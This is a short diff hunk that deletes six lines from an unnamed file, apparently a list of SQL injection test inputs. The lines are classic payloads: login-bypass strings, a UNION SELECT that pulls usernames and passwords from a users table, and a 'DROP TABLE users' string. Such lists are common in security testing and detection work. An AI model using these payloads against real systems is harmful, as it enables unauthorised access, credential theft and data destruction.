@@ -1,6 +1,0 @@
-admin' OR '1'='1
-' OR 1=1 --
-admin'--
-' UNION SELECT username, password FROM users --
-x' OR 'a'='a
-1; DROP TABLE users --
